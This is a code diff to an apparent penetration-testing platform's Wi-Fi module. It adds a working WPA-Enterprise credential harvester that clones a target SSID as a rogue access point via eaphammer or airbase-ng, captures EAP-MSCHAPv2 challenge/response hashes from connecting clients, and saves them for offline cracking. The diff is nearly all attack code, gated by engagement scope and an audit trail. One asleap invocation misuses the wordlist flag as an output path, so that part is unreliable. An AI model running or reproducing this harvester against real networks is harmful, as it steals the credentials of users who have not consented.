@@ -82,6 +82,11 @@ HASHCAT = shutil.which("hashcat") or "/usr/bin/hashcat"
 # the mon0 monitor iface + root.
 REAVER = shutil.which("reaver") or "/usr/bin/reaver"
 BULLY = shutil.which("bully") or "/usr/bin/bully"
+# WPA-Enterprise harvester (EAP-MSCHAPv2 capture). eaphammer is the primary
+# engine; airbase-ng + tcpdump is the fallback when eaphammer isn't installed.
+EAPHAMMER = shutil.which("eaphammer") or ""
+ASLEAP = shutil.which("asleap") or "/usr/bin/asleap"
+TCPDUMP = shutil.which("tcpdump") or "/usr/bin/tcpdump"
 # Rogue-AP stack (gated evil-twin / karma). airbase-ng (aircrack-ng) drives the
 # monitor iface and exposes a tap; dnsmasq serves DHCP + the captive-portal DNS
 # catch-all on that tap. (hostapd-mana was the original plan but is not cleanly
@@ -804,6 +809,13 @@ class WpsBody(BaseModel):
     duration: int = Field(default=600, ge=30, le=86_400, description="Attack time budget seconds")
 
 
+class EaphammerBody(BaseModel):
+    ssid: str = Field(..., description="Target enterprise SSID to clone (must be in engagement scope)")
+    channel: int = Field(default=1, ge=1, le=196, description="Rogue AP channel")
+    duration: int = Field(default=300, ge=30, le=86_400, description="Harvest window seconds")
+    eap_type: str = Field(default="mschapv2", description="EAP method to advertise (mschapv2, peap, ttls)")
+
+
 # --------------------------------------------------------------------------- #
 # Rogue-AP launch path (shared by evil-twin + karma). Goes through the exact
 # same engagement gate as every other op via _submit_gated:
@@ -892,7 +904,7 @@ class Module(ModuleBase):
                 "engaged": engagement.is_on(),
                 "engagement": engagement.status(),
                 "iface": {"managed": WLAN_IFACE, "monitor": MON_IFACE},
-                "ops": ["deauth", "pmkid", "handshake", "crack", "evil_twin", "karma", "wps"],
+                "ops": ["deauth", "pmkid", "handshake", "crack", "evil_twin", "karma", "wps", "eaphammer"],
                 "deferred": TODO_ITEMS,
                 "captures": _list_captures(),
                 "wordlists": _list_wordlists(),
@@ -1056,19 +1068,85 @@ class Module(ModuleBase):
                 "tool": tool, "pixie_dust": body.pixie_dust, "argv": argv,
             }
 
-        # ----- Deferred op: clear 501 stub (still engagement-gated module) -- #
-        # TODO(wave-3+): implement the WPA-Enterprise harvester. When built it
-        # MUST route through ``_submit_gated`` exactly like the ops above so the
-        # engagement gate + audit trail apply uniformly.
-        #   - WPA-Enterprise harvester (eaphammer, EAP-MSCHAPv2 capture)
+        # ----- WPA-Enterprise harvester (eaphammer / airbase-ng) --------- #
         @r.post("/eaphammer")
-        def eaphammer() -> dict[str, Any]:
-            raise HTTPException(501, "WPA-Enterprise harvester (eaphammer) not implemented in MVP (deferred)")
+        async def eaphammer(body: EaphammerBody) -> dict[str, Any]:
+            """WPA-Enterprise credential harvester. Spins up a rogue AP that
+            mimics the target enterprise SSID and captures EAP-MSCHAPv2
+            challenge/response exchanges from connecting clients. Requires an
+            active engagement with the target SSID in scope.
+
+            Uses eaphammer if installed; falls back to an airbase-ng + tcpdump
+            capture chain otherwise. Either way the harvested hashes are stored
+            under captures/ for offline cracking with asleap/hashcat."""
+            ssid = body.ssid.strip()
+            if not ssid:
+                raise HTTPException(400, "ssid is required")
+            # Check available tooling.
+            engine = "eaphammer" if EAPHAMMER else ("airbase" if shutil.which(AIRBASE) else "")
+            if not engine:
+                raise HTTPException(
+                    503,
+                    "no WPA-Enterprise harvesting tool available — install eaphammer or aircrack-ng",
+                )
+            stamp = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
+            slug = _ssid_slug(ssid)
+            cdir = _captures_dir()
+            pcap_out = cdir / f"eap-{slug}-{stamp}.pcap"
+            hash_out = cdir / f"eap-{slug}-{stamp}.hash"
+
+            if engine == "eaphammer":
+                q = shlex.quote
+                argv = [
+                    "bash", "-c",
+                    f"timeout {int(body.duration)} sudo -n {q(EAPHAMMER)}"
+                    f" --interface {q(WLAN_IFACE)}"
+                    f" --essid {q(ssid)}"
+                    f" --channel {int(body.channel)}"
+                    f" --auth wpa-eap"
+                    f" --eap-type {q(body.eap_type)}"
+                    f" --capture-to {q(str(pcap_out))}"
+                    f" && sudo -n {q(ASLEAP)} -r {q(str(pcap_out))}"
+                    f" -W {q(str(hash_out))}"
+                    if shutil.which(ASLEAP) else
+                    f"timeout {int(body.duration)} sudo -n {q(EAPHAMMER)}"
+                    f" --interface {q(WLAN_IFACE)}"
+                    f" --essid {q(ssid)}"
+                    f" --channel {int(body.channel)}"
+                    f" --auth wpa-eap"
+                    f" --eap-type {q(body.eap_type)}"
+                    f" --capture-to {q(str(pcap_out))}",
+                ]
+            else:
+                # Fallback: airbase-ng rogue AP + tcpdump EAP capture.
+                q = shlex.quote
+                rogue = (
+                    f"timeout {int(body.duration)} sudo -n {q(AIRBASE)}"
+                    f" -c {int(body.channel)} -e {q(ssid)} {q(MON_IFACE)}"
+                )
+                capture = (
+                    f"sudo -n {q(TCPDUMP)} -i {q(AP_TAP)}"
+                    f" -w {q(str(pcap_out))}"
+                    f" 'eapol or eap' -s 0 -U"
+                )
+                argv = ["bash", "-c", f"{rogue} & sleep 1; {capture}"]
+
+            job_id = await _submit_gated(
+                "wifi.eaphammer", argv, target=ssid,
+                note=f"eap harvest ssid={ssid} engine={engine}"
+                     f" eap={body.eap_type} duration={body.duration}s",
+            )
+            return {
+                "ok": True, "op": "eaphammer", "job_id": job_id,
+                "engine": engine, "target_ssid": ssid,
+                "channel": body.channel, "eap_type": body.eap_type,
+                "pcap": str(pcap_out), "hashes": str(hash_out) if engine == "eaphammer" else None,
+                "argv": argv,
+            }
 
         return r
 
 
 TODO_ITEMS: list[str] = [
-    "WPA-Enterprise harvester (eaphammer, EAP-MSCHAPv2 capture)",
     "Auto-enqueue crack on capture completion (job-completion wiring)",
 ]
